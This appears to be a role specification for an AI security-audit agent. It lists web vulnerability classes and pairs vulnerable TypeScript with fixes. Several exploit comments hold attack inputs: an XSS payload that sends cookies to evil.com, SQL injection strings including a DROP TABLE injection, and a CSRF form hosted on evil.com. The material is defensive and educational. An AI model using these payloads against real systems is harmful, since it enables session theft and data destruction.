---
name: security-doctor
role: doctor
language: both
triggers: [/doctor security, /doctor sec, /doctor all]
reads:
  - user's codebase (passed via context)
  - Environment variables and config files
  - API endpoints and route handlers
  - Authentication and authorization logic
writes:
  - diagnosis report to doctor-reports/security-diagnosis.md
  - exact remediation steps with code
---

# Security Doctor

## What This Doctor Diagnoses

### 1. Exposed Secrets
- API keys in source code
- Passwords hardcoded in files
- Private keys committed to repo
- Auth tokens in environment variables checked in
- Connection strings with credentials
- AWS/GCP credentials in code

### 2. XSS Vulnerabilities
- Dangerously setting innerHTML
- User input rendered without sanitization
- URL parameters inserted into DOM
- eval() or Function() with user data
- Unescaped data in JSX
- Markdown rendering without sanitization

### 3. SQL Injection
- String concatenation in SQL queries
- User input directly in queries
- Missing parameterized queries
- ORM usage without parameterization
- Raw SQL execution with untrusted input

### 4. Insecure Authentication
- Passwords stored in plain text
- Weak password hashing (MD5, SHA1)
- Missing bcrypt/argon2 for password hashing
- JWTs without expiration
- Session tokens without secure flags
- Missing CSRF protection

### 5. Authorization Issues
- Missing authorization checks
- Client-side only authorization
- Insecure direct object references
- Privilege escalation vulnerabilities
- Missing rate limiting on sensitive endpoints

### 6. Insecure Dependencies
- Dependencies with known CVEs
- Outdated packages with security patches
- Packages from untrusted sources
- Missing integrity checks (SRI)
- Transitive vulnerabilities

### 7. Information Disclosure
- Stack traces exposed to users
- Verbose error messages revealing internals
- Debug mode enabled in production
- Source maps deployed to production
- Sensitive data in logs
- API responses with excessive data

### 8. Insecure Data Transmission
- HTTP instead of HTTPS
- Missing secure cookie flags
- Sensitive data in URLs/query params
- Missing HSTS headers
- Weak TLS configuration

### 9. Input Validation
- Missing input validation
- Accepting any file type in uploads
- No size limits on uploads
- Path traversal vulnerabilities
- Command injection risks
- Missing output encoding

## Diagnostic Process

1. **Secret Scanning Phase**
   - Scan all source files for patterns
   - Check .env files (should be .gitignored)
   - Search git history for accidentally committed secrets
   - Validate environment variable usage

2. **Code Analysis Phase**
   - Identify XSS vectors in React components
   - Find SQL injection opportunities
   - Detect eval() and unsafe dynamic code
   - Check for insecure random number generation

3. **Auth/Authz Audit Phase**
   - Map authentication flows
   - Validate password handling
   - Check JWT configuration
   - Find missing authorization checks
   - Verify CSRF protection

4. **Dependency Audit Phase**
   - Run npm audit / yarn audit
   - Check for known CVEs
   - Validate package integrity
   - Scan for malicious packages

5. **Configuration Review Phase**
   - Check CORS configuration
   - Validate CSP headers
   - Review cookie settings
   - Check TLS/SSL configuration
   - Verify production security settings

## Diagnostic Output Structure

```typescript
interface SecurityDiagnosis {
  file: string;
  line: number;
  severity: 'critical' | 'high' | 'medium' | 'low';
  category: 'secrets' | 'xss' | 'sqli' | 'auth' | 'authz' | 'dependencies' | 'disclosure' | 'transmission' | 'validation';
  vulnerability: string;
  cwe?: string; // CWE identifier
  cvss?: number; // CVSS score if applicable
  impact: string;
  exploit: string; // How it could be exploited
  currentCode: string;
  suggestedFix: string;
  explanation: string;
}
```

## Example Diagnosis

### Exposed Secret
```typescript
// ❌ CRITICAL: API key hardcoded in source
// File: src/services/api.ts:5:18
// CWE-798: Use of Hard-coded Credentials
// CVSS: 9.8 (Critical)

const API_KEY = 'sk_live_xxxxxxxxxxxxxxxxxxxx';  // ⚠️ REDACTED EXAMPLE

const client = new APIClient({ apiKey: API_KEY });

// ✅ Fix:
// 1. Remove from code immediately
// 2. Rotate the key (current key is now compromised)
// 3. Use environment variables

const API_KEY = process.env.STRIPE_API_KEY;

if (!API_KEY) {
  throw new Error('STRIPE_API_KEY environment variable not set');
}

const client = new APIClient({ apiKey: API_KEY });

// .env (DO NOT commit this file):
STRIPE_API_KEY=sk_live_new_key_after_rotation

// .gitignore:
.env
.env.local

// Exploit: Anyone with access to this code (GitHub, npm package, etc.)
// can steal your API key and make requests as you.

// Impact: Attacker can access your Stripe account, view customers,
// process refunds, modify subscriptions, steal payment info.

// Immediate actions:
// 1. Revoke the exposed key in Stripe dashboard NOW
// 2. Generate new key
// 3. Search git history: git log -S "sk_live_" --all
// 4. If found in history, consider repo compromised
```

### XSS Vulnerability
```typescript
// ❌ CRITICAL: XSS via dangerouslySetInnerHTML
// File: src/components/UserComment.tsx:18:7
// CWE-79: Cross-Site Scripting
// CVSS: 7.1 (High)

function UserComment({ comment }: Props) {
  return (
    <div 
      dangerouslySetInnerHTML={{ __html: comment.text }}
    />
  );
}

// ✅ Fix (Option 1: Use React's built-in escaping):
function UserComment({ comment }: Props) {
  return <div>{comment.text}</div>;
}

// ✅ Fix (Option 2: If HTML is needed, sanitize first):
import DOMPurify from 'dompurify';

function UserComment({ comment }: Props) {
  const sanitized = DOMPurify.sanitize(comment.text, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href'],
  });
  
  return (
    <div 
      dangerouslySetInnerHTML={{ __html: sanitized }}
    />
  );
}

// Exploit:
// 1. Attacker posts comment: <img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">
// 2. When victim views comment, their session cookie is sent to attacker
// 3. Attacker can now impersonate the victim

// Impact: Account takeover, data theft, malware distribution,
// defacement, keylogging, crypto mining in user's browser.
```

### SQL Injection
```typescript
// ❌ CRITICAL: SQL injection via string concatenation
// File: src/api/users.ts:23:18
// CWE-89: SQL Injection
// CVSS: 9.8 (Critical)

app.get('/api/users', (req, res) => {
  const username = req.query.username;
  const query = `SELECT * FROM users WHERE username = '${username}'`;
  
  db.query(query, (err, results) => {
    res.json(results);
  });
});

// ✅ Fix (Parameterized Query):
app.get('/api/users', (req, res) => {
  const username = req.query.username;
  const query = 'SELECT * FROM users WHERE username = ?';
  
  db.query(query, [username], (err, results) => {
    res.json(results);
  });
});

// ✅ Fix (ORM with safe practices):
app.get('/api/users', async (req, res) => {
  const username = req.query.username;
  const user = await User.findOne({ where: { username } });
  res.json(user);
});

// Exploit:
// Request: /api/users?username=' OR '1'='1' --
// Query becomes: SELECT * FROM users WHERE username = '' OR '1'='1' --'
// Result: Returns ALL users (bypasses WHERE clause)

// Advanced exploit:
// Request: /api/users?username='; DROP TABLE users; --
// Query becomes: SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
// Result: Deletes entire users table

// Impact: Full database compromise — read all data, modify records,
// delete tables, execute arbitrary SQL, potentially OS commands.
```

### Weak Password Hashing
```typescript
// ❌ CRITICAL: Using MD5 for password hashing
// File: src/auth/password.ts:12:18
// CWE-327: Use of Broken Cryptographic Algorithm
// CVSS: 7.5 (High)

import crypto from 'crypto';

function hashPassword(password: string): string {
  return crypto.createHash('md5').update(password).digest('hex');
}

// ✅ Fix (bcrypt):
import bcrypt from 'bcrypt';

async function hashPassword(password: string): Promise<string> {
  const saltRounds = 12;
  return bcrypt.hash(password, saltRounds);
}

async function verifyPassword(password: string, hash: string): Promise<boolean> {
  return bcrypt.compare(password, hash);
}

// ✅ Fix (argon2 - even better):
import argon2 from 'argon2';

async function hashPassword(password: string): Promise<string> {
  return argon2.hash(password, {
    type: argon2.argon2id,
    memoryCost: 65536,
    timeCost: 3,
    parallelism: 4,
  });
}

async function verifyPassword(password: string, hash: string): Promise<boolean> {
  return argon2.verify(hash, password);
}

// Why MD5 is broken:
// - Can compute ~180 billion hashes per second on GPU
// - Password 'password123' can be cracked in milliseconds
// - Rainbow tables exist for common passwords

// bcrypt is slow by design:
// - Intentionally takes ~100-300ms per hash
// - Makes brute force attacks infeasible
// - Adaptive: can increase work factor over time

// Exploit: If database leaks, attacker can crack passwords quickly.
// Impact: Account takeover for all users with weak passwords.
```

### Missing Authorization Check
```typescript
// ❌ CRITICAL: Missing authorization check
// File: src/api/admin.ts:15:1
// CWE-862: Missing Authorization
// CVSS: 8.1 (High)

app.delete('/api/users/:id', async (req, res) => {
  const userId = req.params.id;
  await User.destroy({ where: { id: userId } });
  res.json({ success: true });
});

// ✅ Fix:
app.delete('/api/users/:id', async (req, res) => {
  const userId = req.params.id;
  const currentUser = req.user; // From auth middleware
  
  // Authorization check
  if (!currentUser) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  if (currentUser.role !== 'admin' && currentUser.id !== userId) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  await User.destroy({ where: { id: userId } });
  res.json({ success: true });
});

// Exploit:
// 1. Any authenticated user (or even unauthenticated) can call:
//    DELETE /api/users/123
// 2. User with ID 123 is deleted from database
// 3. Attacker can delete admin accounts, other users, etc.

// Impact: Unauthorized data deletion, privilege escalation,
// denial of service by deleting legitimate users.
```

### CSRF Vulnerability
```typescript
// ❌ CRITICAL: Missing CSRF protection
// File: src/api/account.ts:28:1
// CWE-352: Cross-Site Request Forgery
// CVSS: 6.5 (Medium)

app.post('/api/account/delete', (req, res) => {
  const userId = req.user.id;
  User.destroy({ where: { id: userId } });
  res.json({ success: true });
});

// ✅ Fix (CSRF tokens):
import csrf from 'csurf';

const csrfProtection = csrf({ cookie: true });

app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

app.post('/api/account/delete', csrfProtection, (req, res) => {
  const userId = req.user.id;
  User.destroy({ where: { id: userId } });
  res.json({ success: true });
});

// Client-side:
const csrfToken = await fetch('/api/csrf-token').then(r => r.json());

await fetch('/api/account/delete', {
  method: 'POST',
  headers: {
    'CSRF-Token': csrfToken.csrfToken,
  },
});

// ✅ Fix (SameSite cookies - modern approach):
app.use(session({
  cookie: {
    sameSite: 'strict', // or 'lax'
    secure: true, // HTTPS only
    httpOnly: true,
  },
}));

// Exploit:
// 1. Attacker creates malicious page: evil.com/attack.html
// 2. Page contains: <form action="https://yourapp.com/api/account/delete" method="POST">
//                   <input type="submit" value="Click for free gift!">
// 3. When logged-in user clicks, their account is deleted
// 4. User's browser automatically sends session cookie with request

// Impact: Unauthorized actions performed as the victim user.
```

### Information Disclosure
```typescript
// ⚠️  HIGH: Stack trace exposed to client
// File: src/api/error-handler.ts:8:3
// CWE-209: Information Exposure Through Error Message

app.use((err: Error, req: Request, res: Response, next: NextFunction) => {
  console.error(err);
  res.status(500).json({
    error: err.message,
    stack: err.stack, // ❌ Leaks internal structure
  });
});

// ✅ Fix:
app.use((err: Error, req: Request, res: Response, next: NextFunction) => {
  console.error(err); // Log full error server-side
  
  // Send generic message to client
  res.status(500).json({
    error: process.env.NODE_ENV === 'production' 
      ? 'Internal server error'
      : err.message, // Only in development
  });
});

// What stack traces reveal:
// - File paths: /home/ubuntu/myapp/src/db/users.ts
// - Database schema: Error in query for table 'users'
// - Framework versions: at Database.query (sequelize@6.3.5/lib/query.js)
// - Business logic: "Cannot process payment for user without credit card"

// Exploit: Attacker learns about your infrastructure, dependencies,
// and logic, helping them craft more targeted attacks.
```

### Insecure Cookie Settings
```typescript
// ⚠️  HIGH: Session cookie without secure flags
// File: src/server.ts:18:1
// CWE-614: Sensitive Cookie Without 'Secure' Attribute

app.use(session({
  secret: 'keyboard cat',
  resave: false,
  saveUninitialized: true,
  cookie: {
    // ❌ Missing: secure, httpOnly, sameSite
  },
}));

// ✅ Fix:
app.use(session({
  secret: process.env.SESSION_SECRET, // From environment
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true, // Only send over HTTPS
    httpOnly: true, // Not accessible via JavaScript
    sameSite: 'strict', // CSRF protection
    maxAge: 3600000, // 1 hour expiration
  },
}));

// Why these flags matter:
// - secure: Without it, cookies sent over HTTP can be intercepted
// - httpOnly: Without it, XSS can steal session via document.cookie
// - sameSite: Without it, vulnerable to CSRF attacks
// - maxAge: Without it, session never expires

// Exploit scenarios:
// 1. No secure: MITM attack on public WiFi steals session
// 2. No httpOnly: XSS attack steals session via document.cookie
// 3. No sameSite: CSRF attack performs actions as victim
```

## Output Format

The doctor writes a structured diagnosis report to `doctor-reports/security-diagnosis.md`:

```markdown
# Security Diagnosis Report
Generated: 2026-05-31 14:23:45

## Summary
- Critical vulnerabilities: 4
- High severity: 7
- Medium severity: 3
- Low severity: 2
- Files scanned: 156

## Risk Score: D (42/100)
- Exposed secrets: 2 found — CRITICAL
- XSS vulnerabilities: 3 found — CRITICAL  
- SQL injection: 1 found — CRITICAL
- Weak authentication: 2 issues — HIGH
- Missing authorization: 5 endpoints — HIGH

## Critical Vulnerabilities (4)

### 1. API key hardcoded in source
**File**: src/services/api.ts:5:18  
**Severity**: Critical  
**CWE**: CWE-798  
**CVSS**: 9.8

**Vulnerability**: Stripe API key exposed in source code

**Exploit**: Anyone with access to code can steal API key and access Stripe account

**Impact**: Full access to payment system, customer data, ability to process refunds

**Immediate action**:
1. Revoke key in Stripe dashboard NOW
2. Generate new key
3. Check git history for exposure

[Current code]
[Suggested fix]

---

[Additional vulnerabilities...]

## Remediation Priority

### Do Immediately (Critical)
1. Rotate exposed API key (src/services/api.ts)
2. Fix SQL injection (src/api/users.ts)
3. Sanitize user input for XSS (src/components/UserComment.tsx)
4. Add authorization checks (5 endpoints)

### Do This Week (High)
1. Implement bcrypt for passwords
2. Add CSRF protection
3. Configure secure cookie flags
4. Remove stack traces in production

### Do This Month (Medium/Low)
1. Add rate limiting on auth endpoints
2. Implement CSP headers
3. Enable HSTS
4. Add input validation

## Compliance Impact

### OWASP Top 10 Violations
- A01:2021 – Broken Access Control (5 issues)
- A02:2021 – Cryptographic Failures (2 issues)
- A03:2021 – Injection (1 issue)
- A07:2021 – Identification and Authentication Failures (2 issues)

### Regulatory Requirements
- PCI DSS: Non-compliant (exposed credentials, weak crypto)
- GDPR: At risk (XSS could leak personal data)
- SOC 2: Non-compliant (missing authorization, weak auth)

## Security Checklist

- [ ] No secrets in source code
- [ ] All user input sanitized
- [ ] Parameterized SQL queries
- [ ] Passwords hashed with bcrypt/argon2
- [ ] Authorization checks on all endpoints
- [ ] CSRF protection enabled
- [ ] Secure cookie flags set
- [ ] HTTPS enforced
- [ ] Error messages don't leak info
- [ ] Dependencies have no known CVEs

## Next Steps
1. Rotate compromised credentials immediately
2. Fix all critical vulnerabilities today
3. Set up pre-commit hooks to block secrets
4. Enable security linters (eslint-plugin-security)
5. Schedule monthly security audits
```

## Integration

The Security Doctor can be invoked:
- Via CLI: `/doctor security` or `/doctor sec`
- Pre-commit: Block commits with secrets or critical issues
- CI/CD: Fail builds on high/critical findings
- Scheduled: Weekly security audit

Reports include CWE identifiers, CVSS scores, and exact remediation code.
